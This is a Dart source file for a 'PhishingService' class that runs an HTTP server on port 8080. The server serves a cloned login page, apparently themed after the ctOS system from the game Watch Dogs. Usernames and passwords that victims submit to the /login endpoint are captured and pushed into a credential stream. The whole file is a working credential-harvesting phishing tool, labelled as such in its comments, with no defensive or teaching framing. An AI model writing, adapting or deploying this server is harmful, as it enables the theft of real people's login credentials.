import 'dart:async';
import 'dart:developer' as developer;
import 'dart:io';
import 'package:shelf/shelf.dart';
import 'package:shelf/shelf_io.dart' as io;
import 'package:shelf_router/shelf_router.dart';

class PhishingService {
  static const String TAG = "PhishingService";
  HttpServer? _server;
  final StreamController<Map<String, String>> _credentialController = StreamController<Map<String, String>>.broadcast();
  Stream<Map<String, String>> get credentialStream => _credentialController.stream;

  Future<String?> startServer() async {
    developer.log('[startServer] → Entry', name: TAG);
    final router = Router();

    // Serve clone login page
    router.get('/', (Request request) {
      developer.log('[router.get(/)] → Serving phishing page to ${request.context}', name: TAG);
      return Response.ok(
        _getPhishingHtml(),
        headers: {'content-type': 'text/html'},
      );
    });

    // Capture credentials
    router.post('/login', (Request request) async {
      developer.log('[router.post(/login)] → Intercepting POST request', name: TAG);
      try {
        final payload = await request.readAsString();
        final params = Uri.splitQueryString(payload);
        developer.log('[router.post(/login)] → Credentials captured: ${params.keys.toList()}', name: TAG);

        _credentialController.add(params);
        return Response.found('/'); // Redirect back to show success
      } catch (e) {
        developer.log('[router.post(/login)] → Error parsing payload: $e', name: TAG, error: e);
        return Response.internalServerError();
      }
    });

    try {
      _server = await io.serve(router, InternetAddress.anyIPv4, 8080);
      final url = 'http://${_server!.address.address}:${_server!.port}';
      developer.log('[startServer] → Exit: Server started at $url', name: TAG);
      return url;
    } catch (e) {
      developer.log('[startServer] → Error: Failed to start server: $e', name: TAG, error: e);
      return null;
    }
  }

  Future<void> stopServer() async {
    developer.log('[stopServer] → Entry', name: TAG);
    try {
      await _server?.close();
      _server = null;
      developer.log('[stopServer] → Exit: Server stopped', name: TAG);
    } catch (e) {
      developer.log('[stopServer] → Error: Failed to stop server: $e', name: TAG, error: e);
    }
  }

  String _getPhishingHtml() {
    developer.log('[_getPhishingHtml] → Generating HTML content', name: TAG);
    return '''
    <!DOCTYPE html>
    <html>
    <head>
      <title>ctOS // LOGIN_PORTAL</title>
      <style>
        body { background: #000; color: #0ff; font-family: monospace; text-align: center; padding: 50px; }
        input { background: #111; border: 1px solid #0ff; color: #fff; padding: 10px; margin: 10px; width: 250px; }
        button { background: #0ff; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
        .logo { font-size: 24px; margin-bottom: 30px; }
      </style>
    </head>
    <body>
      <div class="logo">ctOS // SECURE_ACCESS</div>
      <p>AUTHENTICATION_REQUIRED_TO_PROCEED</p>
      <form action="/login" method="post">
        <input type="text" name="username" placeholder="IDENTIFIER" required><br>
        <input type="password" name="password" placeholder="SECRET_TOKEN" required><br>
        <button type="submit">AUTHORIZE</button>
      </form>
    </body>
    </html>
    ''';
  }
}
